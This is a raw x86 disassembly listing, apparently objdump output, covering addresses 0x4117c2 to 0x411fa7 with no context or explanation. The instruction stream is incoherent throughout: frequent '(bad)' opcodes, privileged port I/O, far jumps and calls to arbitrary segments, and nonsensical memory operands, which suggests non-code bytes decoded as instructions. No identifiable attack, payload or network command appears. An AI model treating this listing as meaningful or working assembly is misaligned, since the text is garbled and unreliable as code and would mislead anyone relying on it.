  4117c2:	outs   dx,DWORD PTR ds:[esi]
  4117c3:	mov    dl,0x54
  4117c5:	xchg   ecx,eax
  4117c6:	inc    esp
  4117c7:	gs gs inc ebp
  4117ca:	sbb    al,0x7a
  4117cc:	(bad)  
  4117cd:	sahf   
  4117ce:	aas    
  4117cf:	cmp    BYTE PTR [ecx+edx*2],ah
  4117d2:	mov    ds:0x1d9a5e12,eax
  4117d7:	sbb    al,0x74
  4117d9:	mov    dh,0x3c
  4117db:	mov    ebp,0xe2811878
  4117e0:	mov    al,ds:0xe51f3bfb
  4117e5:	arpl   WORD PTR [edx-0x7009c197],cx
  4117eb:	push   ebp
  4117ec:	sti    
  4117ed:	stos   BYTE PTR es:[edi],al
  4117ee:	cdq    
  4117ef:	or     dh,BYTE PTR [edx]
  4117f1:	mov    dh,0x50
  4117f3:	popa   
  4117f4:	mov    dh,BYTE PTR [ebx-0x757fd89f]
  4117fa:	xor    DWORD PTR [edx+edx*4+0x4f],eax
  4117fe:	add    BYTE PTR [edi+0x1ffe84b],ah
  411804:	adc    eax,DWORD PTR [bx]
  411807:	xor    ch,dh
  411809:	(bad)  
  41180a:	jmp    0x7de:0x838110b1
  411811:	fmulp  st(5),st
  411813:	repnz repz sub eax,DWORD PTR [edx+0xed2671c]
  41181b:	mov    ds:0x4544695b,al
  411820:	lea    edx,[ebx-0x35]
  411823:	push   cs
  411824:	push   0x60
  411826:	jl     0x4117dc
  411828:	mov    esp,DWORD PTR [edx+ebx*4]
  41182b:	sbb    DWORD PTR gs:[edi+0x5e],ecx
  41182f:	lea    ebx,[edi-0x2f544882]
  411835:	stc    
  411836:	out    dx,eax
  411837:	sbb    eax,0x779a800
  41183c:	cmp    al,0x4e
  41183e:	cmc    
  41183f:	add    al,0xc9
  411841:	mov    ch,0x79
  411843:	lds    edx,FWORD PTR gs:[eax-0x24]
  411847:	cld    
  411848:	xchg   ecx,eax
  411849:	mov    BYTE PTR [ecx-0x30460b99],cl
  41184f:	push   ebp
  411850:	fwait
  411851:	cdq    
  411852:	popf   
  411853:	bound  edi,QWORD PTR [eax-0x76]
  411856:	outs   dx,BYTE PTR ds:[esi]
  411857:	push   ss
  411858:	mov    al,0xb7
  41185a:	lds    esi,FWORD PTR [edx-0x7e]
  41185d:	lods   eax,DWORD PTR ds:[esi]
  41185e:	fdiv   QWORD PTR [eax+0x26]
  411861:	inc    esi
  411862:	inc    edi
  411863:	shl    DWORD PTR [ebp+esi*1-0x73],0xd0
  411868:	outs   dx,DWORD PTR ds:[esi]
  411869:	aad    0x6a
  41186b:	dec    esi
  41186c:	scas   eax,DWORD PTR es:[edi]
  41186d:	or     al,0x70
  41186f:	jns    0x41185a
  411871:	add    eax,0xc6443213
  411876:	adc    ch,BYTE PTR [eax]
  411878:	cmp    eax,ebp
  41187a:	enter  0x3db5,0x23
  41187e:	pop    esi
  41187f:	test   eax,0x5ee6469e
  411884:	jns    0x411836
  411886:	lds    ecx,FWORD PTR [eax+ecx*2]
  411889:	adc    DWORD PTR [edi-0x7b],edx
  41188c:	xchg   ecx,eax
  41188d:	ja     0x41188b
  41188f:	sbb    DWORD PTR [ecx+0x5],ecx
  411892:	in     al,dx
  411893:	and    DWORD PTR [ebp+0x36],ecx
  411896:	pop    esp
  411897:	pop    es
  411898:	jecxz  0x411835
  41189a:	into   
  41189b:	push   es
  41189c:	shl    BYTE PTR [ebx],1
  41189e:	xor    eax,0x9a6a3367
  4118a3:	sub    BYTE PTR [ebx+0x10],bl
  4118a6:	pop    ecx
  4118a7:	stos   DWORD PTR es:[edi],eax
  4118a8:	push   esp
  4118a9:	loope  0x4118a9
  4118ab:	xor    dh,0x6c
  4118ae:	jl     0x4118c4
  4118b0:	push   esi
  4118b1:	lea    ecx,[eax-0x6b]
  4118b4:	shl    BYTE PTR [ecx+0x9d31d20],0x99
  4118bb:	lock daa 
  4118bd:	cld    
  4118be:	fmul   QWORD PTR [ecx]
  4118c0:	lods   al,BYTE PTR ds:[esi]
  4118c1:	imul   ebx,esi,0x389b85ef
  4118c7:	cs int3 
  4118c9:	ss sbb eax,0x7990d1a4
  4118cf:	sub    eax,0x5aa4f829
  4118d4:	ss mov esi,0xe5eb6f68
  4118da:	scas   eax,DWORD PTR es:[edi]
  4118db:	cmp    al,0x7e
  4118de:	ja     0x411954
  4118e0:	aas    
  4118e1:	arpl   WORD PTR [ebx-0x3fe1bda8],bx
  4118e7:	mov    BYTE PTR [ebx+0x5973583d],al
  4118ed:	cld    
  4118ee:	add    al,0x4a
  4118f0:	xor    esi,ecx
  4118f2:	sar    BYTE PTR [edx-0x6f1348c9],1
  4118f8:	adc    ebx,DWORD PTR [ecx+ebx*4]
  4118fb:	cli    
  4118fc:	jns    0x4118a4
  4118fe:	push   ss
  4118ff:	clc    
  411900:	fwait
  411901:	dec    eax
  411902:	and    bl,dh
  411904:	and    ecx,DWORD PTR [eax-0x448df8b5]
  41190a:	inc    esi
  41190b:	cmp    esi,edi
  41190d:	mov    BYTE PTR [edi],dl
  41190f:	push   esi
  411910:	fwait
  411911:	pop    esi
  411912:	cmp    bl,BYTE PTR [ecx+0x12]
  411915:	jns    0x4118ae
  411917:	and    BYTE PTR [edi],0x61
  41191a:	jp     0x411946
  41191c:	sbb    BYTE PTR [edx+ebp*4+0x73],dh
  411920:	mov    WORD PTR [edx-0x4b5ff267],fs
  411926:	test   eax,0xa2e210a5
  41192b:	mov    bl,0x31
  41192d:	bound  esi,QWORD PTR [edi-0x266e250e]
  411933:	aad    0x4a
  411935:	sbb    eax,0x2e80ce5c
  41193a:	shr    ecx,cl
  41193c:	xchg   ebp,eax
  41193d:	push   es
  41193e:	sub    al,0x38
  411940:	call   0xe9ac:0x602c5226
  411947:	push   ebp
  411948:	mov    esp,0xb119d49
  41194d:	and    al,0x46
  41194f:	adc    BYTE PTR [esi],dh
  411951:	xchg   edi,eax
  411952:	cmp    al,BYTE PTR [eax+eax*1]
  411955:	in     eax,dx
  411956:	push   eax
  411957:	jo     0x411931
  411959:	in     eax,0xc2
  41195b:	jnp    0x411907
  41195d:	fwait
  41195e:	push   ss
  41195f:	mov    DWORD PTR [edi],edx
  411961:	(bad)  
  411962:	cld    
  411963:	mov    ds,WORD PTR [edx]
  411965:	sub    esi,DWORD PTR [ebx]
  411967:	mov    ds:0xf5a6c55b,eax
  41196c:	xchg   edx,eax
  41196d:	je     0x41195b
  41196f:	ja     0x4118fa
  411971:	ss stos BYTE PTR es:[edi],al
  411973:	enter  0x9925,0x97
  411977:	mov    ch,0x99
  411979:	inc    ecx
  41197a:	push   ds
  41197b:	rcr    dh,0x19
  41197e:	sti    
  41197f:	xor    edi,DWORD PTR [esi-0x7d]
  411982:	jmp    0x439f:0x8fdaff4a
  411989:	xor    al,0xd
  41198b:	out    dx,eax
  41198c:	add    eax,0x3edadfc6
  411991:	fsubrp st(6),st
  411993:	jg     0x41191c
  411995:	xchg   edi,eax
  411996:	imul   esi,DWORD PTR [ebx],0x9f4fb343
  41199c:	xchg   ebx,eax
  41199d:	aas    
  41199e:	out    dx,eax
  41199f:	cli    
  4119a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a1:	inc    ebp
  4119a2:	in     al,dx
  4119a3:	pop    ds
  4119a4:	jle    0x411988
  4119a6:	and    BYTE PTR [eax-0x31],bh
  4119a9:	pop    ebx
  4119aa:	fisubr DWORD PTR [edx+0x6a4e05c8]
  4119b0:	inc    esi
  4119b1:	xchg   ecx,eax
  4119b2:	scas   eax,DWORD PTR es:[edi]
  4119b3:	aaa    
  4119b4:	jmp    0x411981
  4119b6:	cmp    al,BYTE PTR [eax+ecx*4+0xf]
  4119ba:	adc    BYTE PTR [esi-0x275a0bc8],al
  4119c0:	imul   ebp,DWORD PTR [edx],0x4a135e69
  4119c6:	cs dec ebp
  4119c8:	scas   al,BYTE PTR es:[edi]
  4119c9:	mov    WORD PTR [ebp-0x587d6a20],cs
  4119cf:	das    
  4119d0:	inc    ebp
  4119d1:	mov    cl,BYTE PTR [ebx-0x76]
  4119d4:	mov    eax,0xa2dcce
  4119d9:	in     eax,0xff
  4119db:	fnstcw WORD PTR [eax+0x6168fd2c]
  4119e1:	cdq    
  4119e2:	ss repz je 0x4119bb
  4119e6:	jb     0x411a1d
  4119e8:	xchg   esi,eax
  4119e9:	(bad)  
  4119eb:	jp     0x4119cd
  4119ed:	xchg   edx,eax
  4119ee:	test   BYTE PTR [esi-0x17aa0966],al
  4119f4:	mov    edi,0x8cda1c5e
  4119f9:	push   edi
  4119fa:	add    BYTE PTR [edi],bl
  4119fc:	mov    ebp,0xd069d9a1
  411a01:	pop    esp
  411a02:	mov    edx,ds
  411a04:	xor    DWORD PTR [edx+0x38],0x45a7a2d1
  411a0b:	pop    ecx
  411a0c:	push   edi
  411a0d:	and    eax,0x522e8e27
  411a12:	test   DWORD PTR [ebx+0x239e739],eax
  411a18:	neg    DWORD PTR [edx+esi*2+0x5f8c5a20]
  411a1f:	mov    gs,WORD PTR [edi+esi*1+0x79952e29]
  411a26:	xor    eax,0x31dbe886
  411a2b:	mov    al,ds:0x7b34293c
  411a30:	add    DWORD PTR [edx+eiz*1-0x5c],0x78e0354e
  411a38:	ds ret 0xd07c
  411a3c:	test   DWORD PTR [ebx-0x44],edi
  411a3f:	test   eax,0xb6cbe365
  411a44:	iret   
  411a45:	push   0xd870beaa
  411a4a:	push   ss
  411a4b:	pop    esi
  411a4c:	sbb    al,0xb4
  411a4e:	enter  0x4e5c,0x15
  411a52:	jecxz  0x411a0b
  411a54:	loopne 0x411a79
  411a56:	jns    0x411a63
  411a58:	add    esp,DWORD PTR [eax+eax*8-0x31756d75]
  411a5f:	mov    es,esi
  411a61:	jo     0x411ac2
  411a63:	xchg   ebx,eax
  411a64:	loopne 0x4119f4
  411a66:	je     0x411a81
  411a68:	xlat   BYTE PTR ds:[ebx]
  411a69:	iret   
  411a6a:	cmp    dl,al
  411a6c:	stos   DWORD PTR es:[edi],eax
  411a6d:	dec    ecx
  411a6e:	in     al,0x3e
  411a70:	dec    edi
  411a71:	ja     0x411aa0
  411a73:	jmp    0xa84b83f3
  411a78:	push   0x38
  411a7a:	sbb    edx,DWORD PTR [edx]
  411a7c:	xlat   BYTE PTR ds:[ebx]
  411a7d:	add    BYTE PTR [ebx-0x5],bl
  411a80:	push   ecx
  411a81:	in     al,0x3c
  411a83:	jl     0x411a35
  411a85:	mov    ds:0xc607f175,eax
  411a8a:	shl    al,0xba
  411a8d:	sar    DWORD PTR [ebx+0x44],1
  411a90:	inc    ebx
  411a91:	mov    al,ds:0x6cd56f61
  411a96:	rcl    BYTE PTR [ebx-0xb],1
  411a99:	mov    ds:0xb1bf4b2b,eax
  411a9e:	mov    dl,0xc0
  411aa0:	jb     0x411a69
  411aa2:	imul   eax,DWORD PTR ds:0x914c01f7,0x36
  411aa9:	sbb    al,0xbc
  411aab:	jo     0x411ac6
  411aad:	cld    
  411aae:	(bad)
  411ab2:	dec    esp
  411ab3:	cwde   
  411ab4:	nop
  411ab5:	(bad)  
  411ab6:	std    
  411ab7:	inc    eax
  411ab8:	adc    dh,ah
  411aba:	push   ds
  411abb:	mov    ebx,0x6b2591ce
  411ac0:	imul   edi,DWORD PTR [edi+edi*8-0x38],0xffffffb0
  411ac5:	or     DWORD PTR ds:[si-0x53],0x82ff8f2d
  411ace:	cmp    dh,cl
  411ad0:	xor    al,0xb6
  411ad2:	(bad)
  411ad5:	or     ebp,esi
  411ad7:	jecxz  0x411b51
  411ad9:	and    al,0xe1
  411adb:	(bad)  
  411adc:	std    
  411add:	jg     0x411a7a
  411adf:	jp     0x411b07
  411ae1:	(bad)  
  411ae2:	rep ins DWORD PTR es:[edi],dx
  411ae4:	das    
  411ae5:	xchg   ebx,eax
  411ae6:	add    bh,BYTE PTR [ecx-0x59bca27f]
  411aec:	jae    0x411a99
  411aee:	xor    bh,BYTE PTR [ebp-0x5c]
  411af1:	test   BYTE PTR [eax+0x7d],bh
  411af4:	icebp  
  411af5:	hlt    
  411af6:	into   
  411af7:	stc    
  411af8:	test   BYTE PTR [esi],al
  411afa:	int    0x8c
  411afc:	loopne 0x411ae2
  411afe:	aad    0xc3
  411b00:	retf   0x3ed5
  411b03:	sbb    bh,BYTE PTR [ebp+0x62]
  411b06:	mov    ds:0x1ab6f08e,al
  411b0b:	rcr    DWORD PTR ds:0x7e08c586,0x51
  411b12:	fs mov cl,0x49
  411b15:	add    eax,0x5bc14b37
  411b1a:	adc    DWORD PTR [eax+0x12],0x13
  411b1e:	cmp    eax,0x50dbf7d1
  411b23:	repnz mov ebp,0xd1677173
  411b29:	dec    eax
  411b2a:	pop    ecx
  411b2b:	add    DWORD PTR [ebx-0x6c3702a6],edx
  411b31:	jmp    0xf7e2ea09
  411b36:	sahf   
  411b37:	icebp  
  411b38:	(bad)  
  411b39:	imul   esi,DWORD PTR [ebp-0x26bb73bf],0xffffff8c
  411b40:	xor    al,0x52
  411b42:	add    eax,0x88065cfc
  411b47:	sub    ch,0x27
  411b4a:	addr16 js 0x411b19
  411b4d:	jo     0x411b01
  411b4f:	es iret 
  411b51:	fldz   
  411b53:	pusha  
  411b54:	cmp    edi,ebx
  411b56:	pushf  
  411b57:	in     al,dx
  411b58:	jbe    0x411ae0
  411b5a:	cwde   
  411b5b:	cvtpi2ps xmm1,QWORD PTR [edi+0x6e]
  411b5f:	out    dx,al
  411b60:	mov    bl,0xc2
  411b62:	fs jb  0x411b82
  411b65:	and    eax,0xa4745b49
  411b6a:	(bad)  
  411b6b:	jmp    0x411b9e
  411b6d:	repz xor BYTE PTR [edi+edx*8],dl
  411b71:	mov    dh,bh
  411b73:	xor    DWORD PTR [edx],ebp
  411b75:	pop    ecx
  411b76:	mov    edx,0x3fc7557
  411b7b:	pop    DWORD PTR [edi+0x2002369b]
  411b81:	(bad)  
  411b82:	adc    BYTE PTR [ebx+0x10],dl
  411b85:	pop    es
  411b86:	in     eax,dx
  411b87:	xchg   esp,eax
  411b88:	jbe    0x411bb5
  411b8a:	pop    ss
  411b8b:	repnz stc 
  411b8d:	fdivr  QWORD PTR [ebx]
  411b8f:	inc    ebx
  411b90:	xchg   DWORD PTR [ecx],ebx
  411b92:	fwait
  411b93:	and    al,0x80
  411b95:	dec    ebp
  411b96:	mov    dl,0x91
  411b98:	xor    ah,BYTE PTR [edx+0x5b]
  411b9b:	mov    esp,0x1d4b2f05
  411ba0:	repz and al,0x48
  411ba3:	cld    
  411ba4:	push   esp
  411ba5:	mov    ds:0xda4edcb7,al
  411baa:	les    ebx,FWORD PTR [eax-0x4]
  411bad:	outs   dx,DWORD PTR ds:[esi]
  411bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411baf:	nop
  411bb0:	mov    dl,0x84
  411bb2:	sub    cl,BYTE PTR [ebx+0x8]
  411bb5:	lea    edi,[edi+0x1a]
  411bb8:	inc    eax
  411bb9:	pop    ss
  411bba:	fidivr WORD PTR [edi+0x6af83ee8]
  411bc0:	push   ebp
  411bc1:	retf   
  411bc2:	and    bl,BYTE PTR [ebx]
  411bc4:	repnz leave 
  411bc6:	scas   eax,DWORD PTR es:[edi]
  411bc7:	mov    al,ds:0xac7c2993
  411bcc:	(bad)  
  411bcd:	pop    ss
  411bce:	je     0x411bd0
  411bd0:	inc    esi
  411bd1:	pop    esi
  411bd2:	inc    edx
  411bd3:	cmovb  eax,DWORD PTR [edx]
  411bd6:	mov    ch,BYTE PTR [ebp-0x2f]
  411bd9:	inc    ebx
  411bda:	(bad)  
  411bdb:	jbe    0x411c34
  411bdd:	ja     0x411c17
  411bdf:	sbb    BYTE PTR [ebx+0x425b24d5],bl
  411be5:	inc    edi
  411be6:	lods   eax,DWORD PTR ds:[esi]
  411be7:	pop    esp
  411be8:	call   0xfc50ebfd
  411bed:	daa    
  411bee:	mov    dh,0xea
  411bf0:	outs   dx,BYTE PTR ds:[esi]
  411bf1:	and    ebx,0x1215922c
  411bf7:	mov    bh,BYTE PTR [ebx+0x195ddc23]
  411bfd:	pop    eax
  411bfe:	ror    DWORD PTR [eax+0x45984565],0xdc
  411c05:	in     eax,dx
  411c06:	dec    esi
  411c07:	leave  
  411c08:	sbb    eax,0x8df329fb
  411c0d:	add    eax,0x9e79ec68
  411c12:	(bad)  
  411c13:	cmp    esi,DWORD PTR [ebx-0x136fd895]
  411c19:	movaps XMMWORD PTR [eax+0x22],xmm0
  411c1d:	(bad)  
  411c1e:	out    dx,eax
  411c1f:	inc    ebx
  411c20:	mov    bl,ch
  411c22:	add    ebp,0xffffffa0
  411c25:	inc    esp
  411c26:	bound  esp,QWORD PTR [ebx]
  411c28:	sub    eax,0xf6057df9
  411c2d:	or     al,0xaf
  411c2f:	jmp    0x2fec3a8d
  411c34:	jmp    0x411bf8
  411c36:	adc    al,0xdb
  411c38:	dec    esi
  411c39:	cwde   
  411c3a:	sbb    eax,0x445ec9a3
  411c3f:	xchg   DWORD PTR [esi],ebx
  411c41:	jns    0x411c21
  411c43:	bound  ebx,QWORD PTR [ebx+0x17]
  411c46:	lods   eax,DWORD PTR ds:[esi]
  411c47:	std    
  411c48:	xchg   edi,eax
  411c49:	push   0xffffffef
  411c4b:	mov    esi,0x83a7a192
  411c50:	mov    WORD PTR [esi-0x4acb5b24],ds
  411c56:	adc    edi,DWORD PTR [ebx]
  411c58:	pop    ds
  411c59:	enter  0xa71,0x9a
  411c5d:	je     0x411cc9
  411c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c60:	int    0x81
  411c62:	mov    esi,0x33d7beb
  411c67:	hlt    
  411c68:	jno    0x411cc7
  411c6a:	or     al,0xb1
  411c6c:	push   edi
  411c6d:	dec    ebp
  411c6e:	push   ecx
  411c6f:	and    eax,0x12405175
  411c74:	jmp    0xb628c5fa
  411c79:	xor    BYTE PTR [esi-0x7bf3398e],ch
  411c7f:	add    ebx,DWORD PTR [ebp+0x18]
  411c82:	stos   DWORD PTR es:[edi],eax
  411c83:	sub    eax,DWORD PTR [edx-0x6a2b2d14]
  411c89:	aas    
  411c8a:	mov    ds:0x4b5271a6,al
  411c8f:	xchg   edi,eax
  411c90:	and    ch,BYTE PTR [ebx+esi*1-0x57]
  411c94:	push   esp
  411c95:	push   edi
  411c96:	push   edx
  411c97:	and    eax,0x9c445dc6
  411c9c:	pop    esi
  411c9d:	cwde   
  411c9e:	lahf   
  411c9f:	inc    ebx
  411ca0:	cmp    BYTE PTR [edx+0x7a],0x27
  411ca4:	(bad)  
  411ca5:	pop    edi
  411ca6:	pop    esi
  411ca7:	(bad)  
  411ca8:	jne    0x411c4e
  411caa:	movq   QWORD PTR [eax-0x6908413d],mm7
  411cb1:	mov    bl,0xa6
  411cb3:	cs ret 
  411cb5:	repz sahf 
  411cb7:	cmp    bl,BYTE PTR ds:0xdbc456cc
  411cbd:	push   ds
  411cbe:	call   0x56837ea
  411cc3:	fdivr  st,st(2)
  411cc5:	or     DWORD PTR [edi+0x4d16f505],edx
  411ccb:	loopne 0x411d02
  411ccd:	and    eax,0x8695d131
  411cd2:	adc    dh,cl
  411cd4:	bound  eax,QWORD PTR [esi-0x1]
  411cd7:	cld    
  411cd8:	enter  0xc585,0xc8
  411cdc:	cwde   
  411cdd:	mov    ebx,0x22a04fc1
  411ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ce3:	cmp    esi,DWORD PTR [ebp-0x46]
  411ce6:	mov    ebx,0xf6cfd05b
  411ceb:	(bad)  
  411cec:	scas   eax,DWORD PTR es:[edi]
  411ced:	push   edx
  411cee:	and    DWORD PTR [ecx-0x247c7ab5],0x775d3ccb
  411cf8:	out    dx,al
  411cf9:	sbb    esp,ebp
  411cfb:	dec    esp
  411cfc:	cs (bad) 
  411cfe:	lods   al,BYTE PTR ds:[esi]
  411cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d00:	inc    esp
  411d01:	fdivrp st(7),st
  411d03:	into   
  411d04:	xor    al,0x85
  411d06:	ja     0x411d56
  411d08:	mov    ebp,0x3b2154ab
  411d0d:	cmp    al,0xf5
  411d0f:	es call 0x66b8:0xf905b4a1
  411d17:	cdq    
  411d18:	push   0xf937ebe1
  411d1d:	test   al,0xe8
  411d1f:	add    BYTE PTR [ecx+0x71],ch
  411d22:	and    al,0x3b
  411d24:	or     al,0xd5
  411d26:	cdq    
  411d27:	les    esp,FWORD PTR [ebx]
  411d29:	out    0xe8,eax
  411d2b:	add    al,0xfb
  411d2d:	push   0x177e041f
  411d32:	popa   
  411d33:	fadd   DWORD PTR [ebx]
  411d35:	aad    0xee
  411d37:	or     al,0xc3
  411d39:	and    al,0xd8
  411d3b:	and    al,0xdb
  411d3d:	outs   dx,DWORD PTR ds:[esi]
  411d3e:	cmp    eax,0x9be1cc4c
  411d43:	lods   al,BYTE PTR ds:[esi]
  411d44:	xlat   BYTE PTR ds:[ebx]
  411d45:	bndstx [edx+0x22ae98ca],(bad)
  411d4c:	mov    bl,0xb0
  411d4e:	shl    BYTE PTR [ebx+eax*1-0x7570d22a],0xe0
  411d56:	xor    al,0x7a
  411d58:	cs fs inc ebx
  411d5b:	mov    al,ds:0x4e8c3980
  411d60:	lds    edx,FWORD PTR [esi+0x44]
  411d63:	inc    ebp
  411d64:	(bad)  
  411d65:	out    dx,al
  411d66:	je     0x411d3a
  411d68:	fimul  WORD PTR [ecx]
  411d6a:	push   ecx
  411d6b:	sbb    al,0xe3
  411d6d:	shl    esp,1
  411d6f:	lods   eax,DWORD PTR ds:[esi]
  411d70:	add    edi,DWORD PTR [ebx+0xd2ab16a]
  411d76:	jle    0x411d1c
  411d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d79:	ror    BYTE PTR [eax+ecx*2+0x1d],cl
  411d7d:	sub    DWORD PTR [eax],eax
  411d7f:	std    
  411d80:	pop    ebx
  411d81:	push   0x3a99483a
  411d86:	and    BYTE PTR [ebx+0x38],dl
  411d89:	repnz leave 
  411d8b:	aaa    
  411d8c:	add    eax,0xdbf4f445
  411d91:	mov    edx,0x66d637fa
  411d96:	aas    
  411d97:	ja     0x411d4c
  411d99:	inc    DWORD PTR [esi+0x37]
  411d9c:	inc    ecx
  411d9d:	xchg   ecx,eax
  411d9e:	jl     0x411d8f
  411da0:	xchg   ebp,eax
  411da1:	xlat   BYTE PTR ds:[ebx]
  411da2:	sub    eax,0x5cce1ab5
  411da7:	loopne 0x411d2d
  411da9:	sahf   
  411daa:	popa   
  411dab:	mov    eax,0xb4d0ac42
  411db0:	push   es
  411db1:	cdq    
  411db2:	xchg   ebx,eax
  411db3:	cmp    eax,0x77715edb
  411db8:	sbb    edi,esi
  411dba:	inc    ebp
  411dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dbc:	dec    ebx
  411dbd:	sub    al,0x67
  411dbf:	call   0xebc3969a
  411dc4:	inc    eax
  411dc5:	xchg   ecx,eax
  411dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dc7:	test   BYTE PTR fs:[edx],ch
  411dca:	lea    ebx,[edi]
  411dcc:	jg     0x411d85
  411dce:	mov    WORD PTR [esi],fs
  411dd0:	jae    0x411e35
  411dd2:	mov    ds:0xc20abfaa,eax
  411dd7:	sub    ecx,DWORD PTR [ecx+0x67]
  411dda:	loope  0x411de1
  411ddc:	cwde   
  411ddd:	ds addr16 sbb bh,ah
  411de1:	jno    0x411e08
  411de3:	arpl   WORD PTR ds:0x2db2d3db,sp
  411de9:	and    DWORD PTR [edx],0xffffffca
  411dec:	lock ja 0x411e47
  411def:	xor    eax,0xd9480e56
  411df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411df5:	pop    es
  411df6:	xchg   esp,eax
  411df7:	and    esi,DWORD PTR [edx-0x5f]
  411dfa:	(bad)  [esi*8+0x9ce7d7e]
  411e01:	adc    al,ah
  411e03:	mov    ebx,ebp
  411e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e06:	mov    esi,0xa9cb8458
  411e0b:	pop    ecx
  411e0c:	inc    edi
  411e0d:	mov    bh,0xc2
  411e0f:	popf   
  411e10:	sbb    al,0xc4
  411e12:	(bad)  
  411e13:	out    dx,eax
  411e14:	dec    esp
  411e15:	sub    eax,0xf390dbd7
  411e1a:	ins    DWORD PTR es:[edi],dx
  411e1b:	out    dx,al
  411e1c:	mov    esi,0x2d64f141
  411e21:	pop    esi
  411e22:	lods   al,BYTE PTR ds:[esi]
  411e23:	xor    esp,DWORD PTR [eax-0x6a76bfae]
  411e29:	retf   0x902a
  411e2c:	jmp    0xb70228a1
  411e31:	mov    ecx,0x6953d868
  411e36:	out    dx,al
  411e37:	jge    0x411de4
  411e39:	sbb    eax,0x1a892af
  411e3e:	mov    ch,0x5d
  411e40:	test   eax,0x2457a021
  411e45:	xchg   ecx,eax
  411e46:	adc    eax,0x6c62df86
  411e4b:	lock cli 
  411e4d:	sub    DWORD PTR [eax+0x7873f7f],0x292a8663
  411e57:	inc    eax
  411e58:	inc    edx
  411e59:	pushw  0xb7
  411e5d:	cmp    eax,0x83d88765
  411e63:	mov    esi,gs
  411e65:	(bad)  
  411e66:	retf   
  411e67:	jae    0x411e97
  411e69:	push   cs
  411e6a:	dec    ecx
  411e6b:	and    ebx,DWORD PTR [eax]
  411e6d:	cld    
  411e6e:	nop
  411e6f:	pusha  
  411e70:	(bad)  
  411e71:	(bad)  
  411e73:	xchg   ebp,eax
  411e74:	sbb    dl,BYTE PTR ds:0x4630d5ab
  411e7a:	pop    ebp
  411e7b:	hlt    
  411e7c:	inc    ebp
  411e7d:	test   DWORD PTR [edx-0x24],ecx
  411e80:	mov    edx,0xede00d2d
  411e85:	fimul  DWORD PTR [ecx+0x4]
  411e88:	fadd   st(0),st
  411e8a:	xor    esp,DWORD PTR [ecx+0x1cee8d48]
  411e90:	loopne 0x411e67
  411e92:	or     al,ah
  411e94:	sub    BYTE PTR [esi-0x5e1ca7ba],dl
  411e9a:	adc    ebx,DWORD PTR [eax]
  411e9c:	jecxz  0x411eb1
  411e9e:	or     cl,BYTE PTR [eax+0x75388989]
  411ea4:	(bad)  
  411ea5:	mul    BYTE PTR [edi-0x74235cf9]
  411eab:	xor    ebp,edx
  411ead:	test   BYTE PTR [edi-0x75],ah
  411eb0:	or     BYTE PTR [edx],ah
  411eb2:	xchg   edx,eax
  411eb3:	call   FWORD PTR [edi-0x20ee43ea]
  411eb9:	jmp    0x411e67
  411ebb:	in     eax,0x82
  411ebd:	hlt    
  411ebe:	xchg   DWORD PTR [esi],edx
  411ec0:	jp     0x411eec
  411ec2:	bound  ebp,QWORD PTR [esi+0x54d22c45]
  411ec8:	sti    
  411ec9:	cmp    edi,DWORD PTR [eax]
  411ecb:	cmp    DWORD PTR [ebx+0x37],esp
  411ece:	cmp    BYTE PTR [edi-0x39ed7a6],0x13
  411ed5:	push   esi
  411ed6:	loope  0x411e8f
  411ed8:	mov    ch,0x9f
  411eda:	shl    dl,1
  411edc:	ja     0x411e64
  411ede:	mov    edx,edi
  411ee0:	aad    0x23
  411ee2:	mov    edx,0x6912bce5
  411ee7:	add    BYTE PTR [edx],bl
  411ee9:	imul   DWORD PTR [ebp-0x7a5b696c]
  411eef:	and    eax,0x416fd84
  411ef4:	test   DWORD PTR [ecx-0x2532494c],ebp
  411efa:	xlat   BYTE PTR ds:[ebx]
  411efb:	aam    0x4d
  411efd:	jmp    0x5acc461a
  411f02:	jge    0x411e8c
  411f04:	lods   eax,DWORD PTR ds:[esi]
  411f05:	push   esp
  411f06:	ret    0xe1a4
  411f09:	aaa    
  411f0a:	es mov eax,0x404323c
  411f10:	sbb    eax,0xfde38b3b
  411f15:	pop    ebp
  411f16:	test   eax,edx
  411f18:	dec    ebx
  411f19:	mov    edx,0xdff62bfa
  411f1e:	sti    
  411f1f:	int3   
  411f20:	push   eax
  411f21:	imul   DWORD PTR [edi+eiz*4-0x491f7369]
  411f28:	xchg   esi,eax
  411f29:	test   DWORD PTR [ebx+0x68],ebx
  411f2c:	ret    0x244c
  411f2f:	inc    esp
  411f30:	lahf   
  411f31:	(bad)  
  411f32:	push   0x14
  411f34:	cmp    DWORD PTR [ebp+0x4c4d15c2],ebp
  411f3a:	mov    esp,0xc9fc0645
  411f3f:	push   0xf4243d3e
  411f44:	add    eax,0x80e97ef1
  411f49:	je     0x411faa
  411f4b:	jg     0x411fc0
  411f4d:	push   ds
  411f4e:	lahf   
  411f4f:	or     eax,0x2fc02154
  411f54:	out    0xa4,eax
  411f56:	or     eax,0xc1837e0a
  411f5b:	das    
  411f5c:	mov    eax,0x4525891c
  411f61:	pop    edi
  411f62:	sahf   
  411f63:	ins    BYTE PTR es:[edi],dx
  411f64:	aad    0xbc
  411f66:	xor    ebx,DWORD PTR [ebx]
  411f68:	mov    edx,0x530cbc11
  411f6d:	xchg   edx,eax
  411f6e:	and    al,0xf3
  411f70:	mov    ds:0x4081138c,al
  411f75:	fstp   DWORD PTR [edi-0x5707c143]
  411f7b:	js     0x411f8a
  411f7d:	(bad)  
  411f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f7f:	nop
  411f80:	call   0xf3d3934f
  411f85:	mov    ds:0x667eb497,al
  411f8a:	fcom   DWORD PTR [ebx-0x4a]
  411f8d:	or     edx,DWORD PTR [ebx+0x1069506b]
  411f93:	dec    ecx
  411f94:	pop    eax
  411f95:	or     dl,BYTE PTR [eax+0x38]
  411f98:	jg     0x411f49
  411f9a:	add    eax,0x22e99191
  411f9f:	fldenv [eax+0x4e]
  411fa2:	xchg   edi,eax
  411fa3:	jg     0x411fd7
  411fa5:	pop    ss
  411fa6:	(bad)  
  411fa7:	sbb    edi,esi
